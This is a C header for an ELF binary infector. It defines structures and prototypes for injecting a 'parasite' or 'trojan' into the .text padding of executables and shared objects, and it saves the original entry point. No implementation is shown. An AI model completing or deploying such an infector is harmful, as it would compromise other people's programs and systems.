#ifndef _INFECT_H
#define _INFECT_H

typedef struct infect {
    elf_t   *elfo;
    long    *magic_ptr;
    /** Simple .text padding infection */
    struct {
        elf_addr_t  lsb_exec_addr;      /**< parasite load addr if LSD exec */
        elf_off_t   lsb_so_addr;        /**< parasite load addr if .so */
        elf_off_t   target_offset;      /**< location to inject parasite */
        elf_off_t   o_entry;            /**< Original entry point must be saved before infecting */
    } pad;
    off_t           src_bin_size;       /**< trojan size in disk */
    void           *trojan;             /**< ELF infection; heap allocated via fread() @see utils.c */
} infect_t;

infect_t *inf_load(elf_t *, FILE *, open_mode_t, long);
elf_off_t inf_scan_segment(infect_t *);
bool inf_load_and_patch(infect_t *);
#endif
